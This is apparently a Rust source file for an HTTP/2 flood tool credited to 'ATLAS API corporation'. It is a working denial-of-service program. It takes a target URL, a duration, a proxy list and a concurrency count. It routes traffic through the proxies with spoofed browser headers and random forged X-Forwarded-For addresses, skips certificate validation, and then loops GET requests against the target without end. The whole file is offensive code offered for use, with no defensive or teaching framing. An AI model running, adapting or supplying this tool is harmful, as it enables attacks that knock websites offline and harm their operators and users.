/*
    HTTP2 (TLSv1.3) flood

    Released by ATLAS API corporation

    Made by Benshii Varga
*/

use std::time::{Duration, Instant};
use std::sync::{Arc, Mutex};
use std::env;

use rand::Rng;

use reqwest::header::HeaderValue;

use tokio::fs::OpenOptions;
use tokio::sync::mpsc::{channel, Receiver, Sender};
use tokio::sync::Semaphore;
use tokio::io::AsyncBufReadExt;
use tokio::io::BufReader;

mod proxy;
use proxy::check_proxy;


async fn random_useragent() -> &'static str {
    let user_agents = vec![
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
    ];
    let mut rng = rand::thread_rng();
    user_agents[rng.gen_range(0..user_agents.len())]
}

async fn random_ip() -> &'static str {
    let mut rng = rand::thread_rng();
    let ip_parts: [u8; 4] = rng.gen();
    let ip = ip_parts.iter().map(|&part| part.to_string()).collect::<Vec<String>>().join(".");
    Box::leak(ip.into_boxed_str())
}

async fn build_client(target: &str, proxy: &str) -> Result<reqwest::Client, Box<dyn std::error::Error>> {

    let mut headers = reqwest::header::HeaderMap::new();

    headers.insert("User-Agent", HeaderValue::from_static(random_useragent().await));
    headers.insert("Sec-Fetch-Site", HeaderValue::from_static("cross-site"));
    headers.insert("Sec-Fetch-User", HeaderValue::from_static("?1"));
    headers.insert("Sec-Fetch-Mode", HeaderValue::from_static("navigate"));
    headers.insert("Sec-Fetch-Dest", HeaderValue::from_static("empty"));
    headers.insert("Sec-Ch-Ua", HeaderValue::from_static("\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\""));
    headers.insert("Sec-Ch-Ua-Platform", HeaderValue::from_static("Windows"));
    headers.insert("Sec-Ch-Ua-Mobile", HeaderValue::from_static("?0"));
    headers.insert("Accept", HeaderValue::from_static("text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"));
    headers.insert("Accept-Language", HeaderValue::from_static("ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7"));
    headers.insert("Accept-Encoding", HeaderValue::from_static("gzip, deflate, br"));
    headers.insert("Sec-GPC", HeaderValue::from_static("1"));
    headers.insert("Cache-Control", HeaderValue::from_static("max-age=0"));
    headers.insert("Pragma", HeaderValue::from_static("no-cache"));
    headers.insert("Upgrade-Insecure-Requests", HeaderValue::from_static("1"));
    headers.insert("X-Forwarded-For", HeaderValue::from_static(&random_ip().await));

    let client = reqwest::Client::builder()
        .default_headers(headers)
        .http2_keep_alive_while_idle(true)
        .use_rustls_tls()
        .http2_keep_alive_interval(Some(Duration::from_secs(10)))
        .danger_accept_invalid_certs(true)
        .max_tls_version(reqwest::tls::Version::TLS_1_3)
        .http2_adaptive_window(true)
        .http2_prior_knowledge()
        .proxy(reqwest::Proxy::all(format!("http://{}", proxy.clone()))?)
        .connect_timeout(Duration::from_secs(10))
        .build()?;
    
    attack(target.clone(), client.clone()).await?;
    Ok(client)
}

async fn attack(target: &str, client: reqwest::Client) -> Result<(), Box<dyn std::error::Error>> {
    let target = target.to_owned();
    tokio::task::spawn(async move {
        loop {
            match client.get(target.clone()).send().await {
                Ok(_response) => {
                    //println!("status: {:?}, version: {:?}", response.status(), response.version());
                },
                Err(_err) => {
                    //eprintln!("error: {:?}", err);
                    drop(client);
                    break;
                }
            };
        }
    });
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {

    let args: Vec<String> = env::args().collect();
    if args.len() != 5 {
        println!("
    Usage: ./http2 <target> <time> <proxies> <processes>
    Example: ./http2 https://example.com 60 proxies.txt 12345
        ");
        std::process::exit(1);
    }

    let target = match reqwest::Url::parse(&args[1].to_owned()) {
        Ok(target) => target,
        Err(_) => {
            println!("[!] Invalid target address \"{}\"!", args[1].to_owned());
            std::process::exit(1);
        },
    };
    let time: u64 = match args[2].parse() {
        Ok(time) => time,
        Err(_) => {
            println!("[!] Invalid time \"{}\"!", args[2].to_owned());
            std::process::exit(1);
        },
    };

    let proxies = args[3].to_owned();

    match tokio::fs::metadata(proxies.clone()).await {
        Ok(_) => {},
        Err(_) => {
            println!("[!] file \"{}\" not found!", proxies);
            std::process::exit(1);
        },
    };

    let processes: usize = match args[4].parse() {
        Ok(p) => p,
        Err(_) => {
            println!("[!] Invalid number of processes \"{:?}\"", args[4].to_owned());
            std::process::exit(1);
        },
    };

    println!("[!] Starting attack on {:?} for {:?} seconds!", target.to_string(), time);

    let new_target = Arc::new(Mutex::new(String::from(target.to_string().clone())));

    let (tx, mut rx): (Sender<String>, Receiver<String>) = channel(10000);

    let semaphore = Arc::new(Semaphore::new(processes));
    
    let stdin = OpenOptions::new().read(true).open(proxies).await?;
    let mut reader = BufReader::new(stdin);

    tokio::task::spawn(async move {
        let mut line = String::new();
        while let Ok(n) = reader.read_line(&mut line).await {
            if n == 0 {
                break;
            }
            tx.send(line.clone()).await.unwrap();

            line.clear();
        }
    });

    let start_time = Instant::now();

    std::thread::spawn(move || {
        loop {
            if Instant::now().duration_since(start_time) >= Duration::from_secs(time) {
                println!("[!] Attack ended!");
                std::process::exit(0);
            }
        }
    });

    while let Some(item) = rx.recv().await {
        let semaphore = semaphore.clone();
        let target = Arc::clone(&new_target);
        tokio::spawn(async move {
            let permit = semaphore.acquire().await.unwrap();
            let target = target.lock().unwrap().clone();
            if check_proxy(&item.trim()).await {
                //println!("[+] \"{}\" starting session...", item.trim());
                let _ = build_client(&target, &item.trim()).await;
            }
            drop(permit);
        });
    }

    tokio::signal::ctrl_c().await?;

    Ok(())
}